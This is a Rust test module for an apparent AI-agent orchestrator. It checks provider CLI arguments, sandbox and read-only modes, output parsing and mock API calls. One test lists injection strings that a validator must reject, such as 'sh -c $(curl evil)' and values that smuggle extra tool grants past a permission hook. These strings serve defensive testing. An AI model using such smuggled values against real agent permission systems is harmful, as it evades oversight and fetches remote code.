#[cfg(test)]
mod tests {
    use super::*;
    fn test_request(role: RunRole, permission: PermissionTier) -> AgentRunRequest {
        AgentRunRequest {
            task_id: "TASK-test".into(),
            revision: 1,
            commit_sha: (role == RunRole::Reviewer).then(|| "1234567".into()),
            worktree: PathBuf::from("/tmp/worktree"),
            run_dir: PathBuf::from("/tmp/run"),
            role,
            input_file: ".agentflow-in/input.md".into(),
            timeout: Duration::from_secs(90),
            idle_timeout: Duration::from_secs(30),
            permission,
            // Mirror what the orchestrator computes: a developer run carries an explicit
            // worktree-write grant, everything else is read-only.
            effective_permissions: agentflow_contracts::EffectivePermissions {
                worktree_read: true,
                worktree_write: role == RunRole::Developer,
                sandbox_guarantee: if role == RunRole::Developer {
                    agentflow_contracts::SandboxGuarantee::WorktreeRestricted
                } else {
                    agentflow_contracts::SandboxGuarantee::ReadOnly
                },
                ..Default::default()
            },
            resume_session_id: None,
            permission_hook_program: None,
            extra_allowed_commands: Vec::new(),
            env_denylist: Vec::new(),
            budget: RunBudget::default(),
        }
    }

    #[test]
    fn review_semantic_rule() {
        let raw = r#"{"schema_version":1,"task_id":"t","revision":1,"commit_sha":"1234567","decision":"request_changes","summary":"x","issues":[]}"#;
        assert!(parse_review(raw).is_err());
    }

    #[test]
    fn support_matrix_distinguishes_verified_and_unverified_versions()
    -> Result<(), Box<dyn std::error::Error>> {
        let matrix = compatibility_matrix()?;
        let (verified, baselines) =
            support_level("claude", Some("2.1.217 (Claude Code)"), true, &matrix);
        assert_eq!(verified, CliSupportLevel::Verified);
        assert_eq!(baselines, vec!["2.1.217"]);
        let (untested, _) =
            support_level("claude", Some("2.1.218 (Claude Code)"), true, &matrix);
        assert_eq!(untested, CliSupportLevel::CompatibleUntested);
        let (unsupported, _) =
            support_level("claude", Some("2.1.217 (Claude Code)"), false, &matrix);
        assert_eq!(unsupported, CliSupportLevel::Unsupported);
        assert!(runtime_probe_supported("claude"));
        assert!(runtime_probe_supported("codex"));
        assert!(!runtime_probe_supported("gemini"));
        assert!(!runtime_probe_supported("qwen"));
        assert!(runtime_probe_supported("qodercli"));
        assert!(runtime_probe_supported("grok"));
        assert_eq!(
            cli_request_policy("grok").as_deref(),
            Some("deepseek_forced_tool_choice_non_thinking")
        );
        let (qoder, qoder_versions) =
            support_level("qodercli", Some("1.1.3"), true, &matrix);
        assert_eq!(qoder, CliSupportLevel::Verified);
        assert_eq!(qoder_versions, vec!["1.1.3", "1.1.12"]);
        let (qoder_ci, _) = support_level("qodercli", Some("1.1.12"), true, &matrix);
        assert_eq!(qoder_ci, CliSupportLevel::Verified);
        let (grok, grok_versions) =
            support_level("grok", Some("grok 0.2.111 (build)"), true, &matrix);
        assert_eq!(grok, CliSupportLevel::Verified);
        assert_eq!(grok_versions, vec!["0.2.111"]);
        Ok(())
    }

    #[test]
    fn runtime_probe_failures_are_actionable_and_safe() {
        assert!(classify_runtime_probe_failure("Not logged in", Some(1)).contains("重新登录"));
        assert!(classify_runtime_probe_failure("You've hit your limit", Some(1)).contains("安全降级"));
        assert!(classify_runtime_probe_failure("unknown option --json", Some(2)).contains("已验证版本"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn runtime_probe_executes_in_an_isolated_directory()
    -> Result<(), Box<dyn std::error::Error>> {
        use std::os::unix::fs::PermissionsExt;
        let temp = tempfile::tempdir()?;
        let fake = temp.path().join("fake-claude");
        tokio::fs::write(
            &fake,
            "#!/bin/sh\nprintf '%s\\n' '{\"probe\":\"AGENTFLOW_PROBE_OK\"}'\n",
        )
        .await?;
        std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755))?;
        let result = probe_cli_runtime("claude", &fake).await;
        assert!(result.passed, "{:?}", result.problem);
        Ok(())
    }

    fn passing_review(summary: &str) -> String {
        json!({
            "schema_version": 1,
            "task_id": "task-1",
            "revision": 1,
            "commit_sha": "1234567",
            "decision": "pass",
            "summary": summary,
            "issues": []
        })
        .to_string()
    }

    #[test]
    fn review_parser_accepts_explanation_before_structured_result()
    -> Result<(), Box<dyn std::error::Error>> {
        let output = format!(
            "审查完成，下面是结构化结果：\n\n{}",
            passing_review("handles braces like {value} and escaped quotes \"safely\"")
        );
        let review = parse_review(&output)?;
        assert_eq!(review.decision, ReviewDecision::Pass);
        assert!(review.summary.contains("{value}"));
        Ok(())
    }

    #[test]
    fn review_parser_uses_the_last_valid_json_object()
    -> Result<(), Box<dyn std::error::Error>> {
        let output = format!(
            "diagnostic metadata: {{\"status\":\"ok\"}}\n```json\n{}\n```",
            passing_review("looks good")
        );
        let review = parse_review(&output)?;
        assert_eq!(review.summary, "looks good");
        Ok(())
    }

    #[test]
    fn review_parser_rejects_prose_without_a_result_object() {
        assert!(parse_review("review completed without structured output").is_err());
    }

    #[test]
    fn review_parser_survives_a_stray_unmatched_brace_in_prose()
    -> Result<(), Box<dyn std::error::Error>> {
        // A bare `{` in prose (a placeholder, a truncated code sample) must not swallow every
        // JSON object that follows it.
        let output = format!(
            "note: template uses {{placeholder without a closing brace\n{}",
            passing_review("still found the result")
        );
        let review = parse_review(&output)?;
        assert_eq!(review.summary, "still found the result");
        Ok(())
    }

    #[test]
    fn candidate_scan_ignores_braces_inside_prose_quotes()
    -> Result<(), Box<dyn std::error::Error>> {
        // A quote outside an object still opens a string, so an unbalanced brace inside it
        // cannot unbalance the scan.
        let output = format!(
            "the agent said \"use {{ to open a block\" then returned:\n{}",
            passing_review("quoted brace handled")
        );
        assert_eq!(parse_review(&output)?.summary, "quoted brace handled");
        Ok(())
    }

    #[tokio::test]
    async fn a_truncated_provider_log_is_never_used_to_recover_a_result()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let run_dir = temp.path();
        // A complete, schema-valid draft sits in the log: without the truncation guard it would
        // be accepted as the authoritative deliverable.
        tokio::fs::write(
            run_dir.join("stdout.log"),
            json!({
                "schema_version": 1,
                "task_id": "task-1",
                "revision": 2,
                "status": "completed",
                "summary": "中途草稿",
                "changed_files": []
            })
            .to_string(),
        )
        .await?;
        tokio::fs::write(
            run_dir.join("process-outcome.json"),
            json!({
                "pid": 4242,
                "started_at": "2026-07-27T00:00:00Z",
                "exit_code": 0,
                "timed_out": false,
                "idle_timed_out": false,
                "cancelled": false,
                "log_truncated": true
            })
            .to_string(),
        )
        .await?;
        let Err(error) = read_development_output(run_dir, "claude").await else {
            return Err("a truncated log must not yield a result".into());
        };
        assert!(error.to_string().contains("truncated"), "{error}");

        // With the same log but no truncation, recovery still works as before.
        tokio::fs::write(
            run_dir.join("process-outcome.json"),
            json!({
                "pid": 4242,
                "started_at": "2026-07-27T00:00:00Z",
                "exit_code": 0,
                "timed_out": false,
                "idle_timed_out": false,
                "cancelled": false,
                "log_truncated": false
            })
            .to_string(),
        )
        .await?;
        assert_eq!(
            read_development_output(run_dir, "claude").await?.summary,
            "中途草稿"
        );
        Ok(())
    }

    #[test]
    fn development_parser_recovers_json_from_provider_envelopes()
    -> Result<(), Box<dyn std::error::Error>> {
        let result = json!({
            "schema_version": 1,
            "task_id": "task-1",
            "revision": 2,
            "status": "completed",
            "summary": "完成结构修复",
            "changed_files": ["src/main.rs"]
        })
        .to_string();
        let envelope = json!({
            "type": "item.completed",
            "item": {"type": "agent_message", "text": result}
        })
        .to_string();
        let parsed = parse_development(&envelope)?;
        assert_eq!(parsed.task_id, "task-1");
        assert_eq!(parsed.revision, 2);
        assert_eq!(parsed.summary, "完成结构修复");
        Ok(())
    }

    #[test]
    fn non_strict_providers_may_omit_nullable_plan_and_review_fields()
    -> Result<(), Box<dyn std::error::Error>> {
        let plan = json!({
            "schema_version": 1,
            "task_id": "task-1",
            "plan_version": 1,
            "summary": "只读检查",
            "steps": [{"title": "检查", "detail": "读取仓库状态"}],
            "risks": [],
            "allowed_paths": []
        })
        .to_string();
        assert_eq!(parse_plan(&plan)?.steps[0].validation, None);

        let review = json!({
            "schema_version": 1,
            "task_id": "task-1",
            "revision": 1,
            "commit_sha": "1234567",
            "decision": "request_changes",
            "summary": "需要修复",
            "issues": [{"severity": "high", "title": "问题"}]
        })
        .to_string();
        assert_eq!(parse_review(&review)?.issues[0].file, None);
        Ok(())
    }

    #[test]
    fn qoder_result_event_unwraps_the_structured_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        let plan = json!({
            "schema_version": 1,
            "task_id": "task-qoder",
            "plan_version": 1,
            "summary": "只新增两个文件",
            "steps": [{"title": "实现", "detail": "新增函数", "validation": "bun test"}],
            "risks": [],
            "allowed_paths": ["src/normalizeTag.ts", "src/normalizeTag.test.ts"]
        })
        .to_string();
        let output = format!(
            "{}\n{}\n",
            json!({"type": "assistant", "message": {"content": "planning"}}),
            json!({"type": "result", "subtype": "success", "result": format!("```json\n{plan}\n```")})
        );
        let extracted = provider_output_text("qoder", &output).ok_or("missing Qoder result")?;
        assert_eq!(parse_plan(&extracted)?.task_id, "task-qoder");
        Ok(())
    }

    #[test]
    fn grok_text_events_reassemble_the_structured_payload()
    -> Result<(), Box<dyn std::error::Error>> {
        let plan = json!({
            "schema_version": 1,
            "task_id": "task-grok",
            "plan_version": 1,
            "summary": "只读规划",
            "steps": [{"title": "验证", "detail": "运行测试", "validation": "bun test"}],
            "risks": [],
            "allowed_paths": ["src/**"]
        })
        .to_string();
        let output = std::iter::once(json!({"type": "thought", "data": "ignore me"}))
            .chain(plan.chars().map(|chunk| json!({"type": "text", "data": chunk.to_string()})))
            .chain(std::iter::once(json!({"type": "end", "stopReason": "end_turn"})))
            .map(|event| event.to_string())
            .collect::<Vec<_>>()
            .join("\n");
        let extracted = provider_output_text("grok", &output).ok_or("missing Grok result")?;
        assert_eq!(parse_plan(&extracted)?.task_id, "task-grok");
        Ok(())
    }

    #[tokio::test]
    async fn qoder_and_grok_reviewers_use_their_stream_envelopes()
    -> Result<(), Box<dyn std::error::Error>> {
        let review = json!({
            "schema_version": 1,
            "task_id": "task-review",
            "revision": 1,
            "commit_sha": "1234567",
            "decision": "pass",
            "summary": "审查通过",
            "issues": []
        })
        .to_string();

        let qoder_dir = tempfile::tempdir()?;
        tokio::fs::write(
            qoder_dir.path().join("stdout.log"),
            format!(
                "{}\n",
                json!({"type": "result", "subtype": "success", "result": review})
            ),
        )
        .await?;
        assert_eq!(
            read_review_output(qoder_dir.path(), "qoder").await?.decision,
            ReviewDecision::Pass
        );

        let grok_dir = tempfile::tempdir()?;
        let grok_output = review
            .chars()
            .map(|chunk| json!({"type": "text", "data": chunk.to_string()}).to_string())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(grok_dir.path().join("stdout.log"), grok_output).await?;
        assert_eq!(
            read_review_output(grok_dir.path(), "grok").await?.decision,
            ReviewDecision::Pass
        );
        Ok(())
    }

    #[tokio::test]
    async fn claude_auth_problem_falls_back_when_doctor_cannot_run()
    -> Result<(), Box<dyn std::error::Error>> {
        let Some(problem) = claude_auth_problem(Path::new("/path/that/does/not/exist")).await else {
            return Err("unauthenticated Claude did not explain the problem".into());
        };
        assert!(problem.contains("没有可用的登录凭据"));
        Ok(())
    }

    #[test]
    fn claude_doctor_reports_a_keychain_failure() {
        let doctor = "macOS Keychain is not writable (add-generic-password: returned -25293)";
        assert_eq!(
            claude_doctor_auth_problem(doctor),
            Some("macOS 登录钥匙串不可写或密码不同步，Claude 无法保存 OAuth 登录凭据")
        );
    }

    #[test]
    fn cli_auth_methods_distinguish_accounts_keys_and_tokens() {
        assert_eq!(
            claude_auth_method(&json!({"authMethod":"claude.ai"})).as_deref(),
            Some("account")
        );
        assert_eq!(
            claude_auth_method(
                &json!({"authMethod":"claude.ai","apiKeySource":"ANTHROPIC_API_KEY"})
            )
            .as_deref(),
            Some("api_key")
        );
        assert_eq!(codex_auth_method("Logged in using ChatGPT"), Some("account"));
        assert_eq!(
            codex_auth_method("Logged in using an API key - sk-abc***xyz"),
            Some("api_key")
        );
        assert_eq!(
            codex_auth_method("Logged in using an access token"),
            Some("access_token")
        );
    }

    #[test]
    fn provider_process_identity_environment_keeps_macos_account_context() {
        assert!(PROVIDER_ENV_KEYS.contains(&"USER"));
        assert!(PROVIDER_ENV_KEYS.contains(&"LOGNAME"));
    }

    #[test]
    fn codex_version_normalization_ignores_prerelease_suffix() {
        assert_eq!(
            codex_base_version("codex-cli 0.145.0-alpha.30"),
            Some("0.145.0")
        );
        assert_eq!(codex_base_version("codex-cli 0.144.6"), Some("0.144.6"));
    }

    #[test]
    fn codex_candidate_matches_the_shared_cache_writer_version() {
        let path_cli = PathBuf::from("/opt/local/codex");
        let chatgpt_cli = PathBuf::from("/Applications/ChatGPT.app/Contents/Resources/codex");
        let candidates = vec![
            (path_cli.clone(), "codex-cli 0.144.6".into()),
            (
                chatgpt_cli.clone(),
                "codex-cli 0.145.0-alpha.30".into(),
            ),
        ];
        assert_eq!(
            select_codex_candidate(&candidates, Some("0.145.0")),
            Some(chatgpt_cli)
        );
        assert_eq!(select_codex_candidate(&candidates, None), Some(path_cli));
    }

    #[test]
    fn gemini_and_qwen_use_read_only_review_modes_and_sandboxed_development() {
        let codex_review = codex_args(
            &test_request(RunRole::Reviewer, PermissionTier::Normal),
            Path::new("/tmp/review.schema.json"),
        );
        assert!(
            codex_review
                .iter()
                .any(|value| value == "--ignore-user-config")
        );
        assert!(codex_review.iter().any(|value| value == "--ephemeral"));
        assert!(
            codex_review
                .windows(2)
                .any(|value| value == ["--disable", "plugins"])
        );
        assert!(
            codex_review
                .windows(2)
                .any(|value| value == ["--sandbox", "read-only"])
        );

        let gemini_review = gemini_args(&test_request(RunRole::Reviewer, PermissionTier::Normal));
        assert!(
            gemini_review
                .windows(2)
                .any(|v| v == ["--approval-mode", "plan"])
        );
        assert!(gemini_review.iter().any(|v| v == "--sandbox"));
        let gemini_dev = gemini_args(&test_request(RunRole::Developer, PermissionTier::Normal));
        assert!(
            gemini_dev
                .windows(2)
                .any(|v| v == ["--output-format", "stream-json"])
        );

        let qwen_dev = qwen_args(
            &test_request(RunRole::Developer, PermissionTier::Normal),
            Path::new("/tmp/review.schema.json"),
        );
        assert!(
            qwen_dev
                .windows(2)
                .any(|v| v == ["--approval-mode", "yolo"])
        );
        assert!(qwen_dev.windows(2).any(|v| v == ["--max-wall-time", "90s"]));
        assert!(qwen_dev.iter().any(|v| v == "--sandbox"));
    }

    #[test]
    fn claude_cost_budget_is_hard_but_cli_tokens_are_explicitly_soft() {
        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
        request.budget.remaining_cost_usd = Some(1.25);
        let args = claude_args(&request);
        let Some(position) = args.iter().position(|arg| arg == "--max-budget-usd") else {
            panic!("Claude cost cap was not forwarded");
        };
        assert_eq!(args.get(position + 1).map(String::as_str), Some("1.250000"));
        let caps = ClaudeCodeAdapter::default().budget_capabilities();
        assert_eq!(caps.tokens, BudgetMode::Soft);
        assert_eq!(caps.cost, BudgetMode::Hard);
        assert_eq!(CodexAdapter::new("codex", "review.json").budget_capabilities().cost, BudgetMode::Soft);
    }

    #[test]
    fn claude_resume_is_explicit_and_opaque() {
        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
        assert!(!claude_args(&request).iter().any(|value| value == "--resume"));
        request.resume_session_id = Some("session-123".into());
        assert!(
            claude_args(&request)
                .windows(2)
                .any(|value| value == ["--resume", "session-123"])
        );
    }

    #[test]
    fn a_withheld_write_grant_forces_every_cli_into_read_only_mode() {
        // The broker's verdict used to be advisory for built-in CLIs: they derived read-only
        // from role and tier only, so a development run whose write grant was withheld still
        // started the Provider in a writable mode.
        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
        assert!(!request.is_read_only(), "a granted developer run may write");
        request.effective_permissions.worktree_write = false;
        assert!(request.is_read_only());

        assert!(
            claude_args(&request)
                .windows(2)
                .any(|value| value == ["--disallowedTools", "Write,Edit"])
        );
        assert!(
            codex_args(&request, Path::new("/tmp/review.schema.json"))
                .windows(2)
                .any(|value| value == ["--sandbox", "read-only"])
        );
        assert!(
            gemini_args(&request)
                .windows(2)
                .any(|value| value == ["--approval-mode", "plan"])
        );
        assert!(
            qoder_args(&request)
                .windows(2)
                .any(|value| value == ["--permission-mode", "plan"])
        );
        assert!(
            grok_args(&request)
                .windows(2)
                .any(|value| value == ["--permission-mode", "plan"])
        );

        // A withheld grant also outranks the Yolo escape hatch.
        request.permission = PermissionTier::Yolo;
        assert!(
            codex_args(&request, Path::new("/tmp/review.schema.json"))
                .windows(2)
                .any(|value| value == ["--sandbox", "read-only"])
        );
    }

    #[test]
    fn only_providers_with_a_real_broker_claim_one() {
        // Everything else runs development work under its own auto-approval mode; the
        // orchestrator records that fact per run instead of leaving it implied.
        let schema = Path::new("/tmp/review.schema.json");
        assert!(
            ClaudeCodeAdapter::new("claude")
                .capabilities()
                .permission_broker
        );
        for adapter in [
            Box::new(CodexAdapter::new("codex", schema.to_path_buf())) as Box<dyn AgentAdapter>,
            Box::new(GeminiCliAdapter::new("gemini")),
            Box::new(QwenCodeAdapter::new("qwen", schema.to_path_buf())),
            Box::new(QoderCliAdapter::new("qodercli")),
            Box::new(GrokCliAdapter::new("grok")),
        ] {
            assert!(
                !adapter.capabilities().permission_broker,
                "{} claims a permission broker it does not implement",
                adapter.kind()
            );
        }
    }

    #[test]
    fn extra_allowed_commands_reject_list_separator_injection() {
        // Claude joins these into one comma-separated --allowedTools value, so a comma or a
        // closing paren would declare extra tools the Bash-only permission hook never sees.
        for injection in [
            "git fetch:*),WebFetch,WebSearch,Bash(curl",
            "cargo test,WebFetch",
            "bun test)",
            "sh -c $(curl evil)",
            "cargo test\nWebFetch",
            "",
        ] {
            assert!(
                validate_extra_allowed_command(injection).is_err(),
                "injection was accepted: {injection:?}"
            );
        }
        for legitimate in [
            "cargo test",
            "bun test --watch",
            "npm run build",
            "./scripts/verify.sh",
            "docker compose up",
            "make -j4",
        ] {
            assert!(
                validate_extra_allowed_command(legitimate).is_ok(),
                "legitimate command was rejected: {legitimate:?}"
            );
        }
    }

    #[tokio::test]
    async fn an_injected_extra_allowed_command_never_reaches_a_provider_process()
    -> Result<(), Box<dyn std::error::Error>> {
        let temp = tempfile::tempdir()?;
        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
        request.run_dir = temp.path().join("run");
        request.worktree = temp.path().to_path_buf();
        request.extra_allowed_commands = vec!["git fetch:*),WebFetch,Bash(curl".into()];
        let (tx, _rx) = mpsc::channel(1);
        let started = start_process(
            "claude",
            PathBuf::from("/bin/echo"),
            Vec::new(),
            request,
            CancellationToken::new(),
            tx,
        )
        .await;
        match started {
            Err(AdapterError::Incompatible(_)) => Ok(()),
            Err(other) => Err(format!("unexpected error: {other}").into()),
            Ok(_) => Err("injected allowed command must fail the run before spawning".into()),
        }
    }

    #[test]
    fn claude_dynamic_bash_uses_a_structured_deferred_hook() {
        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
        request.permission_hook_program = Some(PathBuf::from("/opt/Agent Flow/agentflowd"));
        request.extra_allowed_commands = vec!["cargo test".into()];
        let args = claude_args(&request);
        let Some(settings_index) = args.iter().position(|arg| arg == "--settings") else {
            panic!("Claude settings hook was not configured");
        };
        let settings: Value = serde_json::from_str(&args[settings_index + 1])
            .unwrap_or_else(|error| panic!("invalid settings JSON: {error}"));
        let command = settings["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
            .as_str()
            .unwrap_or_default();
        assert!(command.contains("claude-permission-hook"));
        assert!(command.contains("'cargo test'"));
        assert!(command.contains("'/opt/Agent Flow/agentflowd'"));
    }

    #[test]
    fn qoder_and_grok_are_read_only_for_planning_and_resume_only_explicitly() {
        let mut qoder_request = test_request(RunRole::Planner, PermissionTier::ReadOnly);
        let qoder = qoder_args(&qoder_request);
        assert!(qoder.windows(2).any(|v| v == ["--permission-mode", "plan"]));
        assert!(qoder.iter().any(|v| v == "--no-session-persistence"));
        qoder_request.resume_session_id = Some("qoder-session".into());
        let resumed = qoder_args(&qoder_request);
        assert!(resumed.windows(2).any(|v| v == ["--resume", "qoder-session"]));
        assert!(!resumed.iter().any(|v| v == "--no-session-persistence"));

        let qoder_development = qoder_args(&test_request(
            RunRole::Developer,
            PermissionTier::Normal,
        ));
        assert!(
            qoder_development
                .windows(2)
                .any(|v| v == ["--permission-mode", "accept_edits"])
        );

        let grok = grok_args(&test_request(RunRole::Reviewer, PermissionTier::ReadOnly));
        assert!(grok.windows(2).any(|v| v == ["--permission-mode", "plan"]));
        assert!(grok.windows(2).any(|v| v == ["--sandbox", "read-only"]));
        assert!(grok.iter().any(|v| v == "--disable-web-search"));
    }

    #[tokio::test]
    async fn gemini_review_reads_json_response_envelope() -> Result<(), Box<dyn std::error::Error>>
    {
        let temp = tempfile::tempdir()?;
        let review = json!({
            "schema_version": 1,
            "task_id": "task-1",
            "revision": 1,
            "commit_sha": "1234567",
            "decision": "pass",
            "summary": "looks good",
            "issues": []
        })
        .to_string();
        let path = temp.path().join("stdout.log");
        tokio::fs::write(&path, json!({"response": review}).to_string()).await?;
        assert_eq!(
            read_review_from_gemini(&path).await?.decision,
            ReviewDecision::Pass
        );
        Ok(())
    }

    #[test]
    fn extracts_openai_responses_output_text() {
        let adapter =
            ApiProviderAdapter::new(AgentKind::OpenAiApi, ApiProviderSettings::openai_default());
        let value = json!({
            "output": [{
                "type": "message",
                "content": [{"type": "output_text", "text": "{\"decision\":\"pass\"}"}]
            }]
        });
        assert!(matches!(
            adapter.extract_output(&value),
            Ok(output) if output == "{\"decision\":\"pass\"}"
        ));
    }

    #[test]
    fn extracts_anthropic_message_text() {
        let adapter = ApiProviderAdapter::new(
            AgentKind::AnthropicApi,
            ApiProviderSettings::anthropic_default(),
        );
        let value = json!({"content": [{"type": "text", "text": "{}"}]});
        assert!(matches!(adapter.extract_output(&value), Ok(output) if output == "{}"));
    }

    #[test]
    fn extracts_deepseek_chat_completion_text() {
        let adapter = ApiProviderAdapter::new(
            AgentKind::DeepSeekApi,
            ApiProviderSettings::deepseek_default(),
        );
        let value = json!({
            "choices": [{"message": {"role": "assistant", "content": "{}"}}]
        });
        assert!(matches!(adapter.extract_output(&value), Ok(output) if output == "{}"));
    }

    #[test]
    fn new_compatible_providers_use_the_expected_protocol_shapes() {
        let responses = json!({"output_text": "{}"});
        let chat = json!({"choices": [{"message": {"content": "{}"}}]});
        let grok = ApiProviderAdapter::new(
            AgentKind::GrokApi,
            ApiProviderSettings::grok_default(),
        );
        assert!(matches!(grok.extract_output(&responses), Ok(output) if output == "{}"));
        for (kind, settings) in [
            (AgentKind::MiniMaxApi, ApiProviderSettings::minimax_default()),
            (AgentKind::KimiApi, ApiProviderSettings::kimi_default()),
        ] {
            let adapter = ApiProviderAdapter::new(kind, settings);
            assert!(matches!(adapter.extract_output(&chat), Ok(output) if output == "{}"));
        }
    }

    #[tokio::test]
    async fn deepseek_provider_posts_chat_completion_request()
    -> Result<(), Box<dyn std::error::Error>> {
        use tokio::{
            io::{AsyncReadExt, AsyncWriteExt},
            net::TcpListener,
        };

        let listener = TcpListener::bind("127.0.0.1:0").await?;
        let address = listener.local_addr()?;
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut request = vec![0_u8; 32 * 1024];
            let size = stream.read(&mut request).await?;
            let request = String::from_utf8_lossy(&request[..size]);
            let valid = request.starts_with("POST /chat/completions HTTP/1.1")
                && request.contains("authorization: Bearer test-key")
                && request.contains("\"response_format\":{\"type\":\"json_object\"}")
                && request.contains("\"thinking\":{\"type\":\"disabled\"}");
            let review = json!({
                "schema_version": 1,
                "task_id": "task-1",
                "revision": 1,
                "commit_sha": "1234567",
                "decision": "pass",
                "summary": "looks good",
                "issues": []
            })
            .to_string();
            let body = json!({
                "choices": [{"message": {"role": "assistant", "content": review}}]
            })
            .to_string();
            let response = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            stream.write_all(response.as_bytes()).await?;
            Ok::<bool, std::io::Error>(valid)
        });

        let settings = ApiProviderSettings {
            base_url: format!("http://{address}"),
            max_retries: 0,
            ..ApiProviderSettings::deepseek_default()
        };
        let adapter =
            ApiProviderAdapter::new(AgentKind::DeepSeekApi, settings).with_api_key("test-key");
        let (tx, _rx) = mpsc::channel(1);
        let output = adapter
            .call_api(
                "review this diff",
                &RunBudget::default(),
                &CancellationToken::new(),
                &tx,
            )
            .await?;
        assert!(output.text.contains("\"decision\":\"pass\""));
        assert!(server.await??);
        Ok(())
    }

    #[tokio::test]
    async fn api_quota_response_retries_then_recovers()
    -> Result<(), Box<dyn std::error::Error>> {
        use tokio::{
            io::{AsyncReadExt, AsyncWriteExt},
            net::TcpListener,
        };

        let listener = TcpListener::bind("127.0.0.1:0").await?;
        let address = listener.local_addr()?;
        let server = tokio::spawn(async move {
            for attempt in 0..2 {
                let (mut stream, _) = listener.accept().await?;
                let mut request = vec![0_u8; 32 * 1024];
                let _ = stream.read(&mut request).await?;
                let response = if attempt == 0 {
                    let body = r#"{"error":"quota exhausted"}"#;
                    format!(
                        "HTTP/1.1 429 Too Many Requests\r\nretry-after: 0\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    )
                } else {
                    let review = json!({
                        "schema_version": 1,
                        "task_id": "task-1",
                        "revision": 1,
                        "commit_sha": "1234567",
                        "decision": "pass",
                        "summary": "quota retry recovered",
                        "issues": []
                    })
                    .to_string();
                    let body = json!({
                        "choices": [{"message": {"content": review}}]
                    })
                    .to_string();
                    format!(
                        "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                        body.len(),
                        body
                    )
                };
                stream.write_all(response.as_bytes()).await?;
            }
            Ok::<(), std::io::Error>(())
        });

        let settings = ApiProviderSettings {
            base_url: format!("http://{address}"),
            max_retries: 1,
            ..ApiProviderSettings::deepseek_default()
        };
        let adapter =
            ApiProviderAdapter::new(AgentKind::DeepSeekApi, settings).with_api_key("test-key");
        let (tx, mut rx) = mpsc::channel(4);
        let output = adapter
            .call_api(
                "review this diff",
                &RunBudget::default(),
                &CancellationToken::new(),
                &tx,
            )
            .await?;
        assert!(output.text.contains("quota retry recovered"));
        assert!(rx
            .recv()
            .await
            .is_some_and(|event| event.summary.contains("returned 429")));
        server.await??;
        Ok(())
    }

    #[tokio::test]
    async fn openai_provider_posts_responses_request_and_collects_review()
    -> Result<(), Box<dyn std::error::Error>> {
        use tokio::{
            io::{AsyncReadExt, AsyncWriteExt},
            net::TcpListener,
        };

        let listener = TcpListener::bind("127.0.0.1:0").await?;
        let address = listener.local_addr()?;
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut request = vec![0_u8; 32 * 1024];
            let size = stream.read(&mut request).await?;
            let request = String::from_utf8_lossy(&request[..size]);
            let valid = request.starts_with("POST /v1/responses HTTP/1.1")
                && request.contains("authorization: Bearer test-key")
                && request.contains("\"type\":\"json_schema\"");
            let review = json!({
                "schema_version": 1,
                "task_id": "task-1",
                "revision": 1,
                "commit_sha": "1234567",
                "decision": "pass",
                "summary": "looks good",
                "issues": []
            })
            .to_string();
            let body = json!({"output_text": review}).to_string();
            let response = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            stream.write_all(response.as_bytes()).await?;
            Ok::<bool, std::io::Error>(valid)
        });

        let temp = tempfile::tempdir()?;
        let worktree = temp.path().join("worktree");
        let input_dir = worktree.join(".agentflow-in");
        let run_dir = temp.path().join("run");
        tokio::fs::create_dir_all(&input_dir).await?;
        tokio::fs::write(input_dir.join("review-input.md"), "review this diff").await?;
        let mut settings = ApiProviderSettings::openai_default();
        settings.base_url = format!("http://{address}/v1");
        settings.max_retries = 0;
        let adapter =
            ApiProviderAdapter::new(AgentKind::OpenAiApi, settings).with_api_key("test-key");
        let (tx, _rx) = mpsc::channel(16);
        let running = adapter
            .start(
                AgentRunRequest {
                    task_id: "TASK-test".into(),
                    revision: 1,
                    commit_sha: Some("1234567".into()),
                    worktree,
                    run_dir: run_dir.clone(),
                    role: RunRole::Reviewer,
                    input_file: ".agentflow-in/review-input.md".into(),
                    timeout: Duration::from_secs(5),
                    idle_timeout: Duration::from_secs(5),
                    permission: PermissionTier::Normal,
                    effective_permissions: agentflow_contracts::EffectivePermissions::default(),
                    resume_session_id: None,
                    permission_hook_program: None,
                    extra_allowed_commands: Vec::new(),
                    env_denylist: Vec::new(),
                    budget: RunBudget::default(),
                },
                CancellationToken::new(),
                tx,
            )
            .await?;
        assert_eq!(running.outcome.exit_code, Some(0));
        assert!(matches!(
            adapter.collect_result(&run_dir, RunRole::Reviewer).await,
            Ok(CollectedResult::Review(review)) if review.decision == ReviewDecision::Pass
        ));
        assert!(server.await??);
        Ok(())
    }
}
